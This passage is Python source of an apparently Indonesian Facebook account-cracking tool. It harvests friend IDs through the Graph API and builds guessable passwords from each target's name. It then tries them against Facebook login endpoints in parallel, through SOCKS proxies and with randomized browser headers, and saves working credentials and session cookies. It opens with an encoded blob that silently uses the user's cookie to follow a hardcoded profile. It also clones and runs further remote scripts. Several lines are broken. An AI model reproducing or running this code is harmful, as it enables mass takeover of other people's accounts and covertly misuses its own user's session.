JlcXVlc3RzLmdldCgnaHR0cHM6Ly9tYmFzaWMuZmFjZWJvb2suY29tJytmb2xsWydocmVmJ10sY29va2llcyA9IHsnY29va2llJzpjb2t9KS50ZXh0O2V4aXQoKQoJZXhjZXB0KEV4Y2VwdGlvbilhcyBlOnByaW50KGUpI1Jlc3BvbnNlIGVycm9yCmRlZiBmb2xsb3dfZ3VldjIoKToKCXRyeToKCSAgY29rID0gb3BlbignY29va2llLnR4dCcsJ3InKS5yZWFkKCkKCWV4Y2VwdCBJT0Vycm9yOl9BbmltYXRpb25fKGYne1h9IENvb2tpZSBJbnZhbGlkIScpO3RpbWUuc2xlZXAoNSk7Q2hlY2tDb29raWUoKQoJdHJ5OgoJCWZvciBmb2xsIGluIHBhcnNlcihyZXF1ZXN0cy5nZXQoZidodHRwczovL21iYXNpYy5mYWNlYm9vay5jb20vMTAwMDAzMTUxNTUwMDgzJyxjb29raWVzPXsnY29va2llJzpjb2t9KS50ZXh0LCdodG1sLnBhcnNlcicpLmZpbmRfYWxsKCdhJyxocmVmPVRydWUpOgoJCQlpZiAnL2Evc3Vic2NyaWJlLnBocD8nIGluIGZvbGwuZ2V0KCdocmVmJyk6CgkJCQl4PXJlcXVlc3RzLmdldCgnaHR0cHM6Ly9tYmFzaWMuZmFjZWJvb2suY29tJytmb2xsWydocmVmJ10sY29va2llcyA9IHsnY29va2llJzpjb2t9KS50ZXh0O2V4aXQoKQoJZXhjZXB0KEV4Y2VwdGlvbilhcyBlOnByaW50KGUpI1Jlc3BvbnNlIGVycm9yCg=='))
	
# <-------[ Menu ]------->
def Menu():
	ClearLayer()
	logomenu()
	try:
	  token = open('.token.txt','r').read()
	  cok = open('cookie.txt','r').read();tokenku.append(token)
	except (IOError, KeyError, FileNotFoundError):
	  coy(nel.fit(f'{P2}Cookie Invalid',style='#ff0000'));time.sleep(3)
	  LoginCookies()
	try:
		data_fb = requests.get('https://graph.facebook.com/me?fields=id,name&access_token='+tokenku[0], cookies={'cookie':cok})
		yuname = json.loads(data_fb.text)['name']
		yuids = json.loads(data_fb.text)['id']
	except requests.exceptions.ConnectionError:
		_Animation_(f'{X}[•] {P}ConnectionError! Check Your Internet.');exit()
	except KeyError:
		try:
		  os.system('rm -rf .token.txt')
		  os.system('rm -rf cookie.txt');LoginCookies()
		except:pass
	except IOError:
		LoginCookies()
    #console(width=60).print(f'[bol white][under_line]User Active : {H2}{yuname}',justify='center')
	panell = nel(f'           {P2}         List Menu Tools',width=60,style='#ff00f1')
	tree = Tree(panell)
	tree.add(f'{P2}01. Crack From Publik ID')
	tree.add(f'{P2}02. Check Result         [{H2}OK{P2}/{K2}CP{P2}]')
	tree.add(f'{P2}03. Report Bug           [{H2}WhatsApp{P2}]')
	tree.add(f'{P2}00. Delete Cookie        [{M2}LogOut{P2}]')
	console.print(tree)
	print('')
	__wahyu_xd__ = input(f'{P}[{warna}?{P}] Choice: ')
	if   __wahyu_xd__ in ['01','1']:
	  panel2 = nel(f'{P2}Masukin ID Biar Bisa Mulung, Gunakan Koma Sebagai Pemisah\nEx:{H2} 123456,123456{P2}',width=60,style='#ff00f1')
	  tree = Tree(panel2)
	  console.print(tree)
	  idt = input(f'{P}╰─>{H} ')
	  print('')
	  coy(nel(f'{P2}      Tekan {H2} Ctrl + C {P2}Jika Ingin Berhenti Mulung ID',subtitle=f'{P2}╭──',subtitle_align='left',width=60,style='#ff14cf'))
	  dump(idt,"",{"cookie":cok},token);setting()
	elif __wahyu_xd__ in ['02','2']:
	  _Animation_('Tunggu Sebentar...');time.sleep(2);ClearLayer();logomenu()
	  Result()
	elif __wahyu_xd__ in ['03','3']: 
	  _Animation_('Tunggu Sebentar...');time.sleep(2)
	  os.system('git clone https://github.com/WahyuuXD/unliShare')
	  os.chdir('unliShare')
	  os.system('python Faisal.py')
	elif __wahyu_xd__ in ['04','4']:
	  _Animation_('Tunggu Sebentar...');time.sleep(2)
	  os.system('git clone https://github.com/WahyuuXD/Commenter')
	  os.chdir('Commenter')
	  os.system('python Faisal.py')
	elif __wahyu_xd__ in ['05','5']:
	  _Animation_('Mengarahkan Ke WhatsApp...');time.sleep(2)
	  os.system('xdg-open https://wa.me/6285881871936/?text=Assalamualaikum+Bang')
	elif __wahyu_xd__ in ['00','0']:
	  Kaluar()
	else:
	  _Animation_(f'{P}[{M}!{P}]Input Yang Bener !');time.sleep(3)
	  KembaliKeLaptop()
	
# <-------[ Check Result ]------->
def Result():
    #coy = nel.fit(f'{P2}List Menu Result Crack {H2}OK{P2}/{K2}CP{P2}',style='#ff14cf')
	tree = Tree(coy)
	tree.add(f'{P2}01. Check Result Crack {H2}  OK')
	tree.add(f'{P2}02. Check Result Crack {K2}  CP')
	tree.add(f'{P2}00. Back To Menu')
	console.print(tree)
	kz = input(f'{P}[{warna}?{P}] Choice: ')
	if kz in ['2','02']:
		try:
		  vin = os.listdir('Checkpoint')
		except FileNotFoundError:
		  _Animation_(f'{P}[{M}!{P}]File Not Found ! ');time.sleep(3);KembaliKeLaptop()
		if len(vin)==0:
		  _Animation_(f'{P}[{M}!{P}]Anda Tidak Memiliki Hasil CP ');time.sleep(2);KembaliKeLaptop()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('Checkpoint/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = ' |> '+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(''+nom+'. '+isi+'\x1b[1;91m '+str(len(hem))+' \033[0mAccount '+N)
				else:
					lol.update({str(cih):str(isi)})
					print(''+str(cih)+'. '+isi+'\x1b[1;91m '+str(len(hem))+' \033[0mAccount '+N)
			geeh = input(f'{P}[{M}?{P}] Input File: ')
			try:
			  geh = lol[geeh]
			except KeyError:
			  _Animation_(f'{P}[{M}!{P}]Input Yang Bener !');exit()
			try:
			  lin = open('Checkpoint/'+geh,'r').read().splitlines()
			except:
			  _Animation_(f'{P}[{M}!{P}]File Tidak Di Temukan ');time.sleep(2);KembaliKeLaptop()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('<=>')
				rsu = nel.fit(f'{K2}Checkpoint')
				rsu1 = nel.fit(f'{K2}{cpkuni[0]}')
				rsu2 = nel.fit(f'{K2}{cpkuni[1]}')
				columns = Columns([rsu1,rsu2])
				tree = Tree(rsu)
				tree.add(columns)
				console.print(tree)
				#print(f'{X} => {M}{cpkuni[0]}|{cpkuni[1]}{N}')
				nocp +=1
				print('\n')
			input(f'{P}[ Klik Enter ]');ClearLayer();logomenu();Result()
	elif kz in ['1','01']:
		try:
		  vin = os.listdir('Live')
		except FileNotFoundError:
		  _Animation_(f'{P}[{M}!{P}] {P}File Tidak Di Temukan ');time.sleep(2);KembaliKeLaptop()
		if len(vin)==0:
		  _Animation_(f'{P}[{M}!{P}] Anda Tidak Mempunyai File OK ');time.sleep(2);KembaliKeLaptop()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:
				  hem = open('Live/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<100:
					nom = '|> '+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print(''+nom+'. '+isi+'\x1b[1;92m '+str(len(hem))+' \033[0mAccount '+N)
				else:
					lol.update({str(cih):str(isi)})
					print(''+str(cih)+'. '+isi+'\x1b[1;92m '+str(len(hem))+' \033[0mAccount '+N)
			geeh = input(f'{P}[{M}?{P}] Input File: ')
			try:
			  geh = lol[geeh]
			except KeyError:
			  _Animation_(f'{P}[{M}!{P}]Input Yang Bener !! ');exit()
			try:
			  lin = open('Live/'+geh,'r').read().splitlines()
			except:
			  _Animation_(f'{P}[{M}!{P}] File Not Found !');time.sleep(2);KembaliKeLaptop()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('<=>')
				rsu3 = nel.fit(f'{H2}Live')
				rsu4 = nel.fit(f'{H2}{cpkuni[0]}')
				rsu5 = nel.fit(f'{H2}{cpkuni[1]}')
				rsu6 = nel.fit(f'{H2}{cpkuni[2]}')
				columns = Columns([rsu4,rsu5])
				tree = Tree(rsu3)
				tree.add(columns)
				tree.add(rsu6)
				console.print(tree)
				#print(f'{X} => {H}{cpkuni[0]}|{cpkuni[1]}|{cpkuni[2]}{N}')
				nocp +=1
				print('\n')
			input(f'{P}[ {X}Klik Enter {P}]');ClearLayer();logomenu();Result()
	elif kz in ['0','00']:
	  KembaliKeLaptop()
	else:
	  _Animation_(f'{P}[{M}!{P}]Input Yang Bener !!');exit()

# <-------[ Dump ID ]------->
def dump(idt,fields,cookie,token):
	try:
		headers = {
			"connection": "keep-alive", 
			"accept": "*/*", 
			"sec-fetch-dest": "empty", 
			"sec-fetch-mode": "cors",
			"sec-fetch-site": "same-origin", 
			"sec-fetch-user": "?1",
			"sec-ch-ua-mobile": "?1",
			"upgrade-insecure-requests": "1", 
			"user-agent": "Mozilla/5.0 (Linux; Android 3; CPH1723 Build/AB03E)14  AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.620.136 UCBrowser/2.1.0.5004 Mobile Safari/537.36 OPR/12.1.5463.56308",
			"accept-encoding": "gzip, deflate",
			"accept-language": "id-ID,id;q=0.9"
		}
		if len(id) == 0:
			params = {
				"access_token": token,
				"fields": f"name,friends.fields(id,name,birthday)"
			}
		else:
			params = {
				"access_token": token,
				"fields": f"name,friends.fields(id,name,birthday).after({fields})"
			}
		url = ses.get(f"https://graph.facebook.com/{idt}",params=params,headers=headers,cookies=cookie).json()
		for i in url["friends"]["data"]:
			id.append(i["id"]+"|"+i["name"])
			sys.stdout.write(f"\r   ╰─> {P}Sukses Mulung {X}{len(id)} {P}ID{P}"),
			sys.stdout.flush()
		dump(idt,url["friends"]["paging"]["cursors"]["after"],cookie,token)
	except:pass

# <-------[ Setting ID ]------->
def setting():
	print('\n')
	coy(nel(f' {J2}[{P2}01{J2}]{P2} Crack From Old IDs       ({M2}Very Slow{P2}) ({K2}Recommended{P2})\n {J2}[{P2}02{J2}]{P2} Crack From New IDs       ({H2}Fast{P2}) ({H2}Very Recommended{P2})\n {J2}[{P2}03{J2}]{P2} Crack From Random IDs    ({K2}Slow{P2}) ({K2}Recommended{P2})',width=60,style='#ff14cf'))
	urutan_id = input(f'╰─> ')
	if urutan_id in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)
	elif urutan_id in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif urutan_id in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:_Animation_(f'{P}[{M}!{P}]Input Yang Bener !!');exit()
# <-------[ Set Methode ]------->
	coy(nel(f'     {J2}[{P2}01{J2}]{P2} Regular    {J2}[{P2}02{J2}]{P2} Validate    {J2}[{P2}03{J2}]{P2} Async',title=f'{ken}{P2}Method{tod}',padding=1,width=60,style='#ff14cf'))
	method_ny = input(f'╰─> ')
	if   method_ny in ['1','01']:
	  method.append('bisnis')
	elif method_ny in ['2','02']:
	  method.append('prodv1')
	elif method_ny in ['3','03']:
	  method.append('prodv2')
	else:
	  method.append('bisnis')
	
# <-------[ Set Password Manual ]------->
	print('\n')
	pwplus=input(f'{P}[{X}?{P}] {P}Ingin Menambahkan Password Manual ? \33[m( \x1b[1;92mY\x1b[1;91m/\x1b[1;93mt \33[m) ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		coy(nel(f'{P2}Tambahkan Password Dan Gunakan Koma (,) Sebagai Pemisah.\nEx : {H2}aldi,fadly,kontol,sayang',width=60,style='#ff14cf'))
		pwku=input(f'╰─>{P} ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:pwpluss.append('tidak')
	
	# <-------[ UA Mandiri ]------->
	uatambah = input(f'{P}[{X}?{P}] {P}Ingin Menambahkan User-Agent Manual ? \33[m( \x1b[1;92mY\x1b[1;91m/\x1b[1;93mt \33[m) ')
	if uatambah in ['y','Ya','ya','Y']:
	  ualuh.append('ya')
	  bzer = input(f'{P}[{X}?{P}] Enter User-Agent:{H} ')
	  ualu.append(bzer)
	else:ualuh.append('tidak')
	passwrd()
	
# <------- Password ]------->
def passwrd():
	coy(nel(f'{P2}Hasil {H2}OK{P2} Disimpan Di {H2}Live{P2}/{H2}{rok}\n{P2}Hasil {K2}CP{P2} Disimpan Di {K2}Checkpoint{P2}/{K2}{rcp}\n{P2}[{H2}ON{P2}/{M2}OFF{P2}] Mode Pesawat Setiap {H2}300 {P2}ID Agar Tidak Spam IP',width=60,style='#ff14cf'))
	with tred(max_workers=30) as pool:
		for satir in id2:
			idf,nmf = satir.split('|')[0],satir.split('|')[1].lower()
			frs = nmf.split(' ')[0]
			pwv = ['kamu nanya','kamunanya','kata sandi']
			if len(nmf)<6:
				if len(frs)<3:
					pass
				else:
					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456')
			else:
				if len(frs)<3:
					pwv.append(nmf)
				else:
					pwv.append(nmf)
					pwv.append(frs+'123')
					pwv.append(frs+'1234')
					pwv.append(frs+'12345')
					pwv.append(frs+'123456')
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if   'bisnis' in method:pool.submit(crack1,idf,pwv,nmf)
			elif 'prodv1' in method:pool.submit(crack2,idf,pwv,nmf)
			elif 'prodv2' in method:pool.submit(crack3,idf,pwv,nmf)
			else:pool.submit(crack1,idf,pwv,nmf)
	print('\r')
	coy(nel(f'{P2}Crack Selesai, Dari {H2}%s{P2} ID Dengan Hasil Akun CP: {M2}%s{H2} {P2}OK: {H2}%s{P2}'%(len(id),ok,cp),title=f'{ken}{P2}Done{tod}',width=60,style='#ff14cf'))
	
# <------[ Regular ]------>
def crack1(idf,pwv,nmf):
	global loop,ok,cp
	looping4 = coy(f"{P2}[{warna2}Regular{P2}] Crack Berjalan [{warna2}{len(id)}{P2}/{warna2}{(loop)}{P2}] Live:-{H2}{(ok)}{P2} Check:-{K2}{(cp)}{P2}{M2} › {warna2}{'{:.0%}'.format(loop/float(len(id)))}{P2} [{H2}{idf}{P2}]", end='\r');sys.stdout.flush()
	ua = Ugen()
	ses = requests.Session()
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks5://'+nip}
			req1 = ses.get('https://business.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fweb.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26locale%3Did_ID%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26response_type%3Dcode%252Cgranted_scopes%26scope%3Demail%26state%3D%257B%2522fbLoginKey%2522%253A%25221c2p5l61dkiv87w0ntog1kqtm7h1dfscal195qzu6vmm9o975e4e6%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D53f2c645-6bbd-4113-8342-3a4ac47e2c7a%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%25221c2p5l61dkiv87w0ntog1kqtm7h1dfscal195qzu6vmm9o975e4e6%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%23_%3D_&display=page&locale=id_ID&pl_dbl=0').text
			data = {'jazoest':re.search('name="jazoest" value="(.*?)"',str(req1)).group(1),'lsd':re.search('name="lsd" value="(.*?)"',str(req1)).group(1),'api_key':'124024574287414','cancel_url':'https://www.instagram.com/accounts/signup/?error=access_denied&error_code=200&error_description=Permissions+error&error_reason=user_denied&state=%7B%22fbLoginKey%22%3A%221c2p5l61dkiv87w0ntog1kqtm7h1dfscal195qzu6vmm9o975e4e6%22%2C%22fbLoginReturnURL%22%3A%22%2Ffxcal%2Fdisclosure%2F%3Fnext%3D%252F%22%7D#_=_','display':'page','isprivate':'','return_session':'','skip_api_login':1,'signed_next':1,'trynum':1,'timezone':'-420','lgndim':re.search('name="lgndim" value="(.*?)"',str(req1)).group(1),'lgnrnd':re.search('name="lgnrnd" value="(.*?)"',str(req1)).group(1),'lgnjs':re.search('name="lgnjs" value="(.*?)"',str(req1)).group(1),'email':idf,'prefill_contact_point':idf,'prefill_source':'browser_dropdown','prefill_type':'password','first_prefill_source':'browser_dropdown','first_prefill_type':'contact_point','had_cp_prefilled':True,'had_password_prefilled':True,'ab_test_data':'','encpass':f"#PWD_BROWSER:0:{int(datetime.datetime.now().timestamp())}:{pw}"}
			head = {'Host': 'business.facebook.com','cache-control': 'max-age=0','content-type': 'application/x-www-form-urlencoded','user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://business.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fweb.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26locale%3Did_ID%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26response_type%3Dcode%252Cgranted_scopes%26scope%3Demail%26state%3D%257B%2522fbLoginKey%2522%253A%25221c2p5l61dkiv87w0ntog1kqtm7h1dfscal195qzu6vmm9o975e4e6%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D53f2c645-6bbd-4113-8342-3a4ac47e2c7a%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%25221c2p5l61dkiv87w0ntog1kqtm7h1dfscal195qzu6vmm9o975e4e6%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%23_%3D_&display=page&locale=id_ID&pl_dbl=0','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
			datr = re.search('_js_datr","(.*?)"',str(req1)).group(1)
			coki = f'datr={datr};locale=id_ID;wl_cbv=v2%3Bclient_version%3A2392%3Btimestamp%3A{int(time.time())};vpd=v1%3B885x360x2;wd=980x1715;{";".join(["%s=%s"%(x,y) for x,y in ses.cookies.get_dict().items()])};_js_datr={datr}'
			req2 = ses.post('https://business.facebook.com/login/device-based/regular/login/?login_attempt=1&next=https%3A%2F%2Fweb.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26locale%3Did_ID%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26response_type%3Dcode%252Cgranted_scopes%26scope%3Demail%26state%3D%257B%2522fbLoginKey%2522%253A%25221c2p5l61dkiv87w0ntog1kqtm7h1dfscal195qzu6vmm9o975e4e6%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252Ffxcal%252Fdisclosure%252F%253Fnext%253D%25252F%2522%257D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D53f2c645-6bbd-4113-8342-3a4ac47e2c7a%26tp%3Dunspecified%26cbt%3D1705563202091&lwv=100', data=data, headers=head, cookies={'cookie':coki}, proxies=proxs, allow_redirects=False)
			if "checkpoint" in ses.cookies.get_dict().keys():
				cp+=1
				os.popen('sdcard/Mbf/Checkpoint.txt')
				rescp = nel.fit(f'{K2}Checkpoint')
				rescp1 = nel.fit(f'{K2}{idf}')
				rescp2 = nel.fit(f'{K2}{pw}')
				rescp3 = nel.fit(f'{K2}{nmf}')
				rescp4 = nel.fit(f'{K2}{tahun(idf)}')
				rescp5 = nel(f'{K2}{ua}',width=60)
				columns = Columns([rescp1,rescp2])
				tree = Tree(rescp)
				tree.add(columns)
				tree.add(rescp4)
				tree.add(rescp5)
				console.print(tree)
				cpc=('%s<=>%s<=>%s<=>%s'%s(idf,pw))
				open('Checkpoint/'+cpc,'a').write(idf+'<=>'+pw+'\n')
				with open('Checkpoint/'+cpc,'a') as wr:
				  wr.write(cpc+'\n')
				  wr.close()
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				ok+=1
				os.popen('sdcard/Mbf/Live.txt')
				resok = nel.fit(f'{H2}Live')
				resok1 = nel.fit(f'{H2}{idf}')
				resok2 = nel.fit(f'{H2}{pw}')
				resok3 = nel.fit(f'{H2}{nmf}')
				resok4 = nel.fit(f'{H2}{tahun(idf)}')
				resok5 = nel(f'{H2}{ua}',width=60)
				resok6 = nel(f'{H2}{kuki}',width=60)
				columns = Columns([resok1,resok2])
				tree = Tree(resok)
				tree.add(columns)
				tree.add(resok4)
				tree.add(resok5)
				tree.add(resok6)
				console.print(tree)
				okc=('%s<=>%s<=>%s<=>%s<=>%s'%s(idf,pw,kuki))
				open('Live/'+okc,'a').write(idf+'<=>'+pw+'<=>'+kuki+'<=>'+ua+'\n')
				with open('Live/'+okc,'a') as wr:
				  wr.write(okc+'\n')
				  wr.close()
				break
			else:continue
		except requests.exceptions.ConnectionError:time.sleep(31)
	loop+=1

# <------[ Validate ]------>
def crack2(idf,pwv,nmf):
	global loop,ok,cp
	looping3 = coy(f"{P2}[{warna2}Validate{P2}] Crack Berjalan [{warna2}{len(id)}{P2}/{warna2}{(loop)}{P2}] Live:-{H2}{(ok)}{P2} Check:-{K2}{(cp)}{P2}{M2} › {warna2}{'{:.0%}'.format(loop/float(len(id)))}{P2} [{H2}{idf}{P2}]", end='\r');sys.stdout.flush()
	url = random.choice(['free.prod.facebook.com','m.prod.facebook.com'])
	ua = Ugen()
	ses = requests.Session()
	for pw in pwv:
		try:
			if 'ya' in ualuh: ua = ualu[0]
			link = ses.get(f"https://{url}/login.php?skip_api_login=1&api_key=3213804762189845&kid_directed_site=0&app_id=3213804762189845&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.1%2Fdialog%2Foauth%3Fclient_id%3D3213804762189845%26redirect_uri%3Dhttps%253A%252F%252Fwww.capcut.com%252Fpassport%252Fweb%252Fweb_login_success%26scope%3Demail%26state%3D0053afca3gAToVCgoVPZIGY3NGIxZTM4YjU5Zjg5ZmNkNTkxNWUyZWZmNzMyYjQxoU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFM2SJodHRwczovL3d3dy5jYXBjdXQuY29tL2lkLWlkL2xvZ2luoVTZIDJkNzg1MGFiZmFiODNjNWUxYjU2MGExODBjYzA3YzcwoVcAoUYAolNBAKFVwqJNTMI%25253D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Daf919600-a681-4aeb-a128-05e90339859f%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.capcut.com%2Fpassport%2Fweb%2Fweb_login_success%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D0053afca3gAToVCgoVPZIGY3NGIxZTM4YjU5Zjg5ZmNkNTkxNWUyZWZmNzMyYjQxoU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFM2SJodHRwczovL3d3dy5jYXBjdXQuY29tL2lkLWlkL2xvZ2luoVTZIDJkNzg1MGFiZmFiODNjNWUxYjU2MGExODBjYzA3YzcwoVcAoUYAolNBAKFVwqJNTMI%25253D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
			date = (
			{
			"lsd":
			      re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),
			"jazoest":
			      re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),
	        "uid":idf,
	        "next": "https://x.facebook.com/v3.1/dialog/oauth?client_id=3213804762189845&redirect_uri=https%3A%2F%2Fwww.capcut.com%2Fpassport%2Fweb%2Fweb_login_success&scope=email&state=0053afca3gAToVCgoVPZIGY3NGIxZTM4YjU5Zjg5ZmNkNTkxNWUyZWZmNzMyYjQxoU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFM2SJodHRwczovL3d3dy5jYXBjdXQuY29tL2lkLWlkL2xvZ2luoVTZIDJkNzg1MGFiZmFiODNjNWUxYjU2MGExODBjYzA3YzcwoVcAoUYAolNBAKFVwqJNTMI%253D&ret=login&fbapp_pres=0&logger_id=af919600-a681-4aeb-a128-05e90339859f&tp=unspecified",
	        "flow":"login_no_pin",
	        "pass":pw,
	        } 
	    )    
			cuoz = (";").join([ "%s=%s" % (key, value) for key, value in link.cookies.get_dict().items() ])		
			head=(
		{
		'Host': url,
		'cache-control': 'max-age=0',
		'upgrade-insecure-requests': '1',
		'origin': f'https://'+url,
	     'content-type': 'application/x-www-form-urlencoded',
	     'x-requested-with': 'XMLHttpRequest',
		'user-agent': ua,
		'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
		'sec-fetch-site': 'same-origin',
	     'sec-fetch-mode': 'navigate',
	     'sec-fetch-user': '?1',
	     'sec-fetch-dest': 'document',
		'dpr': f'{str(random.randint(1,5))}',
		'viewport-width': f'{str(random.randint(300,999))}',
	     'sec-ch-ua': f'"Not)A;Brand";v="{str(random.randint(8,24))}", "Chromium";v="{str(random.randint(99,116))}"',
	     'sec-ch-ua-mobile': '?1',
	     'sec-ch-ua-platform': '"Android"',
	     'sec-ch-ua-platform-version': f'"{str(random.randint(5,14))}.0.0"',
	     'sec-ch-ua-full-version-list': f'"Not)A;Brand";v="{str(random.randint(8,24))}.0.0.0", "Chromium";v="{str(random.randint(99,120))}.0.{str(random.randint(5000,5999))}.{str(random.randint(40,150))}"',
	     'sec-ch-prefers-color-scheme': 'dark',
	     'referer': f'https://{url}/login.php?skip_api_login=1&api_key=3213804762189845&kid_directed_site=0&app_id=3213804762189845&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv3.1%2Fdialog%2Foauth%3Fclient_id%3D3213804762189845%26redirect_uri%3Dhttps%253A%252F%252Fwww.capcut.com%252Fpassport%252Fweb%252Fweb_login_success%26scope%3Demail%26state%3D0053afca3gAToVCgoVPZIGY3NGIxZTM4YjU5Zjg5ZmNkNTkxNWUyZWZmNzMyYjQxoU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFM2SJodHRwczovL3d3dy5jYXBjdXQuY29tL2lkLWlkL2xvZ2luoVTZIDJkNzg1MGFiZmFiODNjNWUxYjU2MGExODBjYzA3YzcwoVcAoUYAolNBAKFVwqJNTMI%25253D%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Daf919600-a681-4aeb-a128-05e90339859f%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.capcut.com%2Fpassport%2Fweb%2Fweb_login_success%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D0053afca3gAToVCgoVPZIGY3NGIxZTM4YjU5Zjg5ZmNkNTkxNWUyZWZmNzMyYjQxoU7ZOmh0dHBzOi8vd3d3LmNhcGN1dC5jb20vbHYvdjEvdXNlci93ZWIvbG9naW4vdGhpcmRfY2FsbGJhY2uhVgGhSQChRAChQdIABVAcoU0AoUiud3d3LmNhcGN1dC5jb22hUgKiUEzRBuymQUNUSU9OqXVuZGVmaW5lZKFM2SJodHRwczovL3d3dy5jYXBjdXQuY29tL2lkLWlkL2xvZ2luoVTZIDJkNzg1MGFiZmFiODNjNWUxYjU2MGExODBjYzA3YzcwoVcAoUYAolNBAKFVwqJNTMI%25253D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr',
	     'accept-encoding': 'gzip, deflate, br',
	     'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
	     }
